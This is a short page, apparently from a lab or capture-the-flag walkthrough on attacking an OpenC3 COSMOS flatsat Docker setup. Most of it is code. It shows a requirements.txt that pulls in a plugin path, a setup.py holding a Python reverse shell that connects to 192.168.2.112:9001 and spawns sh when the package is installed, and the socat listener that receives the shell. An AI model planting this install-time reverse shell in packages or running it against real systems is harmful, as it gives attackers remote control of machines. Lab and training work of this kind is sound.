---
title: "4. Pwn the docker"
description: "Using our password we can now install a vulnerable script."
excerpt: "Using our password we can now install a vulnerable script."
draft: false
weight: 50
images: ["code.png"]
categories: ["software"]
tags: ["security", "software", "flatsat", "environment"]
contributors: ["Kevin Leon"]
pinned: false
homepage: true
---



```bash
bat requirements.txt  
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: requirements.txt
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Python dependencies
   2   │ /gems/gems/openc3-cosmos-pypoc-1.0.0/targets/
───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

```


``` bash
bat targets/setup.py
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: targets/setup.py
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ import os,pty,socket
   2   │ s = socket.socket()
   3   │ s.connect(("192.168.2.112", 9001))
   4   │ [os.dup2(s.fileno(), f) for f in(0,1,2)]
   5   │ pty.spawn("sh")
   6   │ 
───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
```bash
socat file:`tty`,raw,echo=0 tcp-listen:9001
```


